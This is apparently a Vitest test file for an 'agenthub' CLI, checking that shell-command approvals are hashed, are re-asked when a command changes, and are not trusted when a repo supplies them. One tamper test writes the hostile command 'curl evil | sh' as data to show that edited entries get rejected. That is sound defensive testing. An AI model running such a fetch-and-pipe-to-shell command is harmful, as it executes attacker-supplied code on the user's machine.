import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import readline from 'node:readline';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { runCli } from '../src/cli.js';
import { commandHash, isApproved, loadApprovals, recordApprovals, resetApprovals } from '../src/core/approvals.js';
import { setCustomHome } from '../src/core/detector.js';
import { hubId, stateFile } from '../src/core/state.js';
import { spawnSync } from 'node:child_process';
import { STANDARD_IGNORE_ENTRIES } from '../src/core/git-sync.js';
import { readIgnored } from '../src/core/local.js';
import { readOrigins } from '../src/core/mcp-sync.js';

const git = (cwd: string, ...args: string[]) => spawnSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@test', ...args], { cwd, encoding: 'utf-8' });

const write = (file: string, text: string) => {
  fs.mkdirSync(path.dirname(file), { recursive: true });
  fs.writeFileSync(file, text);
};

describe('approvals store', () => {
  let hub: string;
  beforeEach(() => {
    hub = fs.mkdtempSync(path.join(os.tmpdir(), 'agenthub-appr-store-'));
  });
  afterEach(() => fs.rmSync(hub, { recursive: true, force: true }));

  const ref = (text: string, item = 'c', role = 'check') => ({ kind: 'mcp' as const, item, role, text });

  it('is keyed by kind, item, role and the SHA-256 of the exact text', () => {
    recordApprovals(hub, [ref('echo hi')]);
    const list = loadApprovals(hub);
    expect(list).toEqual([{ kind: 'mcp', item: 'c', role: 'check', sha256: commandHash('echo hi'), command: 'echo hi' }]);
    expect(commandHash('echo hi')).toMatch(/^[0-9a-f]{64}$/);
    expect(isApproved(list, ref('echo hi'))).toBe(true);
    expect(isApproved(list, ref('echo hi '))).toBe(false);
    expect(isApproved(list, ref('echo hi', 'other'))).toBe(false);
    expect(isApproved(list, ref('echo hi', 'c', 'install'))).toBe(false);
    expect(isApproved(list, { ...ref('echo hi'), kind: 'skills' })).toBe(false);
  });

  it('a changed command replaces the earlier approval of the same item and role', () => {
    recordApprovals(hub, [ref('one'), ref('inst', 'c', 'install')]);
    recordApprovals(hub, [ref('two')]);
    expect(loadApprovals(hub).map((e) => [e.role, e.command])).toEqual([['check', 'two'], ['install', 'inst']]);
  });

  it('is deterministic, tolerates a missing or broken file, and can be reset', () => {
    expect(loadApprovals(hub)).toEqual([]);
    write(path.join(hub, 'approvals.json'), '{oops');
    expect(loadApprovals(hub)).toEqual([]);
    recordApprovals(hub, [ref('b', 'z'), ref('a', 'y')]);
    expect(loadApprovals(hub).map((e) => e.item)).toEqual(['y', 'z']);
    expect(resetApprovals(hub)).toBe(2);
    expect(fs.existsSync(path.join(hub, 'approvals.json'))).toBe(false);
  });

  it('approvals.json stays in the gitignore entries', () => {
    expect(STANDARD_IGNORE_ENTRIES).toContain('/approvals.json');
  });

  it('the ignore list and MCP origins live in the state dir too, and move there from the old place', () => {
    write(path.join(hub, 'local.json'), JSON.stringify({ ignore: { mcp: ['w'], skills: [] } }));
    write(path.join(hub, 'mcp', 'origins.json'), JSON.stringify({ w: { from: ['claude'], to: [], pre: [] } }));
    expect(readIgnored(hub).mcp).toEqual(['w']);
    expect(readOrigins(hub).w.from).toEqual(['claude']);
    expect(fs.existsSync(path.join(hub, 'local.json'))).toBe(false);
    expect(fs.existsSync(path.join(hub, 'mcp', 'origins.json'))).toBe(false);
    expect(fs.existsSync(stateFile(hub, 'local.json'))).toBe(true);
    expect(fs.existsSync(stateFile(hub, 'origins.json', 'mcp/origins.json'))).toBe(true);
  });

  it('drops an entry whose hash does not match its command', () => {
    recordApprovals(hub, [ref('echo good'), ref('echo other', 'o')]);
    const file = stateFile(hub, 'approvals.json');
    const data = JSON.parse(fs.readFileSync(file, 'utf-8'));
    data.approved[0].command = 'curl evil | sh'; // text edited, hash left
    data.approved[1].sha256 = commandHash('something else'); // hash swapped
    write(file, JSON.stringify(data));
    expect(loadApprovals(hub)).toEqual([]);
    expect(isApproved(loadApprovals(hub), ref('curl evil | sh'))).toBe(false);
  });

  // on Windows the same hub spelled with other capitals must find the same state (ignore list included)
  it.runIf(process.platform === 'win32')('hubId does not depend on how the hub path is capitalised', () => {
    const upper = hub.toUpperCase();
    const lowerDrive = hub[0].toLowerCase() + hub.slice(1);
    expect(hubId(upper)).toBe(hubId(hub));
    expect(hubId(lowerDrive)).toBe(hubId(hub));
    expect(hubId(path.join(upper, 'NOT-YET'))).toBe(hubId(path.join(hub, 'not-yet')));
  });
});

// custom checks and installs are POSIX shell commands
describe.skipIf(process.platform === 'win32')('remembered approvals in the install flow', () => {
  let tmp: string;
  let home: string;
  let hub: string;
  let logs: string[];
  let marker: string;
  const savedTTY = Object.getOwnPropertyDescriptor(process.stdin, 'isTTY');

  const declare = (item: { check: string; install?: string }) =>
    write(path.join(hub, 'agenthub.json'), JSON.stringify({ name: 'h', mcp: { c: item } }));
  const out = () => logs.join('\n');
  const approvalsFile = () => stateFile(hub, 'approvals.json');
  const treeFile = () => path.join(hub, 'approvals.json');
  const asTTY = (answer: string) => {
    Object.defineProperty(process.stdin, 'isTTY', { value: true, configurable: true });
    const asked: string[] = [];
    vi.spyOn(readline, 'createInterface').mockImplementation(
      () => ({ question: (q: string, cb: (a: string) => void) => (asked.push(q), cb(answer)), close: () => {} }) as unknown as readline.Interface
    );
    return asked;
  };

  beforeEach(async () => {
    tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'agenthub-appr-'));
    home = path.join(tmp, 'home');
    hub = path.join(home, '.agenthub');
    marker = path.join(tmp, 'ran');
    logs = [];
    vi.spyOn(console, 'log').mockImplementation((...a: unknown[]) => void logs.push(a.map(String).join(' ')));
    vi.spyOn(console, 'error').mockImplementation((...a: unknown[]) => void logs.push(a.map(String).join(' ')));
    process.exitCode = undefined;
    await runCli(['-H', home, 'setup', '--scaffold-only']);
    logs.length = 0;
    // the check fails until the marker exists, so the install command has to run
    declare({ check: `test -f "${marker}"`, install: `touch "${marker}"` });
  });

  afterEach(() => {
    vi.restoreAllMocks();
    setCustomHome(null, null);
    process.exitCode = undefined;
    if (savedTTY) Object.defineProperty(process.stdin, 'isTTY', savedTTY);
    else delete (process.stdin as { isTTY?: boolean }).isTTY;
    fs.rmSync(tmp, { recursive: true, force: true });
  });

  it('first run without --yes and without a TTY runs nothing and records nothing', async () => {
    await runCli(['-H', home, 'install']);
    expect(process.exitCode).toBe(1);
    expect(out()).toContain('pending (no TTY, re-run with --yes)');
    expect(fs.existsSync(marker)).toBe(false);
    expect(fs.existsSync(approvalsFile())).toBe(false);
  });

  it('--yes runs and records one entry per command; a later run with the same commands does not ask', async () => {
    await runCli(['-H', home, 'install', '--yes']);
    expect(process.exitCode).toBeUndefined();
    expect(fs.existsSync(marker)).toBe(true);
    expect(loadApprovals(hub).map((e) => [e.item, e.role])).toEqual([['c', 'check'], ['c', 'install']]);

    // second run: everything is already approved, so no TTY and no --yes is needed
    fs.rmSync(marker);
    logs.length = 0;
    await runCli(['-H', home, 'install']);
    expect(process.exitCode).toBeUndefined();
    expect(out()).toContain('Install plan (1)');
    expect(out().match(/\(approved before\)/g)).toHaveLength(2);
    expect(out()).toContain('All 2 command(s) were approved before');
    expect(out()).not.toContain('pending');
    expect(fs.existsSync(marker)).toBe(true);
  });

  it('a changed command is new again: only it asks, the unchanged one stays marked', async () => {
    await runCli(['-H', home, 'install', '--yes']);
    fs.rmSync(marker);
    declare({ check: `test -f "${marker}" && true`, install: `touch "${marker}"` });
    logs.length = 0;
    await runCli(['-H', home, 'install']);
    expect(process.exitCode).toBe(1);
    expect(out()).toContain('pending (no TTY, re-run with --yes)');
    expect(out().match(/\(approved before\)/g)).toHaveLength(1);
    expect(out()).toMatch(/install: touch .*\(only if check fails\)  \(approved before\)/);
    expect(fs.existsSync(marker)).toBe(false);
  });

  it('asks on a TTY, records on y, and does not ask again', async () => {
    const asked = asTTY('y');
    await runCli(['-H', home, 'install']);
    expect(asked).toEqual(['Run these 1 item(s)? [y/N] ']);
    expect(fs.existsSync(marker)).toBe(true);
    expect(loadApprovals(hub)).toHaveLength(2);

    fs.rmSync(marker);
    await runCli(['-H', home, 'install']);
    expect(asked).toHaveLength(1);
    expect(fs.existsSync(marker)).toBe(true);
  });

  it('declining records nothing and runs nothing', async () => {
    const asked = asTTY('n');
    await runCli(['-H', home, 'install']);
    expect(asked).toHaveLength(1);
    expect(fs.existsSync(marker)).toBe(false);
    expect(fs.existsSync(approvalsFile())).toBe(false);
    expect(out()).toContain('pending (declined)');
  });

  it('approves the commands of the plan only for the item that declared them', async () => {
    await runCli(['-H', home, 'install', '--yes']);
    fs.rmSync(marker);
    write(path.join(hub, 'agenthub.json'), JSON.stringify({ name: 'h', mcp: { other: { check: `test -f "${marker}"`, install: `touch "${marker}"` } } }));
    logs.length = 0;
    await runCli(['-H', home, 'install']);
    expect(process.exitCode).toBe(1);
    expect(out()).not.toContain('(approved before)');
  });

  it('agenthub approvals lists them and --reset forgets them', async () => {
    await runCli(['-H', home, 'install', '--yes']);
    logs.length = 0;
    await runCli(['-H', home, 'approvals']);
    expect(out()).toContain('mcp c [check]');
    expect(out()).toContain('mcp c [install]');
    expect(out()).toContain(commandHash(`test -f "${marker}"`).slice(0, 12));

    logs.length = 0;
    await runCli(['-H', home, 'approvals', '--reset']);
    expect(out()).toContain('Cleared 2 approval(s)');
    expect(fs.existsSync(approvalsFile())).toBe(false);
    logs.length = 0;
    await runCli(['-H', home, 'approvals']);
    expect(out()).toContain('No commands are approved');

    fs.rmSync(marker);
    await runCli(['-H', home, 'install']);
    expect(process.exitCode).toBe(1);
  });

  it('the hub .gitignore keeps approvals.json out of the repo', async () => {
    await runCli(['-H', home, 'install', '--yes']);
    expect(fs.readFileSync(path.join(hub, '.gitignore'), 'utf-8').split(/\r?\n/)).toContain('/approvals.json');
  });

  it('approvals live outside the hub work tree, under the per-hub state dir', async () => {
    await runCli(['-H', home, 'install', '--yes']);
    expect(fs.existsSync(treeFile())).toBe(false);
    const file = stateFile(hub, 'approvals.json');
    expect(fs.existsSync(file)).toBe(true);
    const rel = path.relative(home, file).split(path.sep);
    expect(rel.slice(0, 3)).toEqual(['.local', 'state', 'agenthub']);
    expect(rel[3]).toBe(hubId(hub));
    expect(hubId(hub)).toMatch(/^[0-9a-f]{16}$/);
  });

  it('a hub repo that commits approvals.json with valid hashes does not pre-approve anything', async () => {
    const entries = [`test -f "${marker}"`, `touch "${marker}"`].map((command, i) => ({
      kind: 'mcp', item: 'c', role: i === 0 ? 'check' : 'install', sha256: commandHash(command), command,
    }));
    write(treeFile(), JSON.stringify({ version: 1, approved: entries }));
    git(hub, 'init', '-q');
    git(hub, 'add', '-A');
    git(hub, 'commit', '-q', '-m', 'from the remote author');
    expect(git(hub, 'ls-files').stdout).toContain('approvals.json');

    logs.length = 0;
    await runCli(['-H', home, 'install']);
    expect(process.exitCode).toBe(1);
    expect(out()).toContain('pending (no TTY, re-run with --yes)');
    expect(out()).not.toContain('approved before');
    expect(out()).toContain('is tracked in the hub repo');
    expect(fs.existsSync(marker)).toBe(false);
    expect(fs.existsSync(stateFile(hub, 'approvals.json'))).toBe(false);
  });

  it('an untracked approvals.json from before the state dir moves there once', async () => {
    const command = `test -f "${marker}"`;
    write(treeFile(), JSON.stringify({ version: 1, approved: [{ kind: 'mcp', item: 'c', role: 'check', sha256: commandHash(command), command }] }));
    expect(loadApprovals(hub).map((e) => e.command)).toEqual([command]);
    expect(fs.existsSync(treeFile())).toBe(false);
    expect(fs.existsSync(stateFile(hub, 'approvals.json'))).toBe(true);
  });

  it('a repo-authored approvals.json does not become trusted after push untracks it', async () => {
    const entries = [`test -f "${marker}"`, `touch "${marker}"`].map((command, i) => ({
      kind: 'mcp', item: 'c', role: i === 0 ? 'check' : 'install', sha256: commandHash(command), command,
    }));
    const bare = path.join(tmp, 'remote.git');
    git(tmp, 'init', '-q', '--bare', '-b', 'main', bare);
    write(treeFile(), JSON.stringify({ version: 1, approved: entries }));
    git(hub, 'init', '-q', '-b', 'main');
    git(hub, 'add', '-f', '-A');
    git(hub, 'commit', '-q', '-m', 'from the remote author');
    git(hub, 'remote', 'add', 'origin', bare);
    await runCli(['-H', home, 'push']);
    expect(fs.existsSync(treeFile())).toBe(false);

    logs.length = 0;
    process.exitCode = undefined;
    await runCli(['-H', home, 'install']);
    expect(out()).toContain('pending (no TTY, re-run with --yes)');
    expect(out()).not.toContain('approved before');
    expect(fs.existsSync(marker)).toBe(false);
    expect(loadApprovals(hub)).toEqual([]);
  });

  it('push untracks approvals.json, local.json and mcp/origins.json that a repo carries, and removes them', async () => {
    const bare = path.join(tmp, 'remote.git');
    git(tmp, 'init', '-q', '--bare', '-b', 'main', bare);
    write(treeFile(), '{"version":1,"approved":[]}');
    write(path.join(hub, 'local.json'), '{}');
    write(path.join(hub, 'mcp', 'origins.json'), '{}');
    git(hub, 'init', '-q', '-b', 'main');
    git(hub, 'add', '-f', '-A');
    git(hub, 'commit', '-q', '-m', 'carries machine state');
    git(hub, 'remote', 'add', 'origin', bare);
    await runCli(['-H', home, 'push']);
    const tracked = git(bare, 'ls-tree', '-r', '--name-only', 'main').stdout.split('\n');
    expect(tracked).not.toContain('approvals.json');
    expect(tracked).not.toContain('local.json');
    expect(tracked).not.toContain('mcp/origins.json');
    for (const rel of ['approvals.json', 'local.json', 'mcp/origins.json']) expect(fs.existsSync(path.join(hub, rel))).toBe(false);
  });

  it('changed sources under an unchanged build string ask again', async () => {
    const dir = path.join(hub, 'mcp', 'servers', 'c');
    write(path.join(dir, 'index.js'), 'one');
    write(path.join(hub, 'mcp', 'servers.json'), JSON.stringify({ mcpServers: { c: { command: 'node', args: ['x'] } } }));
    write(path.join(hub, 'agenthub.json'), JSON.stringify({ name: 'h', mcp: { c: { source: 'local', build: 'true' } } }));
    await runCli(['-H', home, 'install', '--yes']);
    expect(process.exitCode).toBeUndefined();
    expect(loadApprovals(hub).map((e) => e.role)).toEqual(['build']);

    write(path.join(dir, 'index.js'), 'two');
    logs.length = 0;
    await runCli(['-H', home, 'install']);
    expect(process.exitCode).toBe(1);
    expect(out()).toContain('pending (no TTY, re-run with --yes)');
    expect(out()).not.toContain('approved before');
  });

  it('MCP probe lines are approved per server and exact line (setup)', async () => {
    write(path.join(hub, 'agenthub.json'), JSON.stringify({ name: 'h' }));
    write(path.join(hub, 'mcp', 'servers.json'), JSON.stringify({ mcpServers: { srv: { command: 'node', args: ['${HOME}/s.js'] } } }));

    await runCli(['-H', home, 'setup']);
    expect(out()).not.toContain('Will start to verify');
    expect(fs.existsSync(approvalsFile())).toBe(false);

    logs.length = 0;
    await runCli(['-H', home, 'setup', '--yes']);
    expect(out()).toContain('Will start to verify (1)');
    expect(loadApprovals(hub).map((e) => [e.kind, e.item, e.role])).toEqual([['mcp', 'srv', 'probe']]);

    logs.length = 0;
    await runCli(['-H', home, 'setup']);
    expect(out()).toMatch(/srv: node .*\(approved before\)/);
    expect(out()).toContain('All 1 command(s) were approved before');

    write(path.join(hub, 'mcp', 'servers.json'), JSON.stringify({ mcpServers: { srv: { command: 'node', args: ['${HOME}/other.js'] } } }));
    logs.length = 0;
    await runCli(['-H', home, 'setup']);
    expect(out()).not.toContain('approved before');
  });

  it('a probe is approved for its whole config: a changed env value, cwd, url or header value asks again', async () => {
    const servers = (cfg: Record<string, unknown>) => write(path.join(hub, 'mcp', 'servers.json'), JSON.stringify({ mcpServers: { srv: cfg } }));
    write(path.join(hub, 'agenthub.json'), JSON.stringify({ name: 'h' }));
    const base = { command: 'node', args: ['s.js'], env: { TOKEN: 'one' }, cwd: '/work/a' };
    servers(base);
    await runCli(['-H', home, 'setup', '--yes']);

    const approvedAfter = async (cfg: Record<string, unknown>) => {
      servers(cfg);
      logs.length = 0;
      await runCli(['-H', home, 'setup']);
      return out().includes('(approved before)');
    };
    expect(await approvedAfter(base)).toBe(true);
    expect(await approvedAfter({ ...base, env: { TOKEN: 'two' } })).toBe(false);
    expect(await approvedAfter({ ...base, cwd: '/work/b' })).toBe(false);
    // the shown line still lists only the key names, not the values
    expect(out()).not.toContain('two');

    await runCli(['-H', home, 'approvals', '--reset']);
    const remote = { url: 'https://mcp.example.com/x', headers: { Authorization: 'a' } };
    servers(remote);
    await runCli(['-H', home, 'setup', '--yes']);
    expect(await approvedAfter(remote)).toBe(true);
    expect(await approvedAfter({ ...remote, headers: { Authorization: 'b' } })).toBe(false);
    expect(await approvedAfter({ ...remote, url: 'https://mcp.example.com/y' })).toBe(false);
  });
});
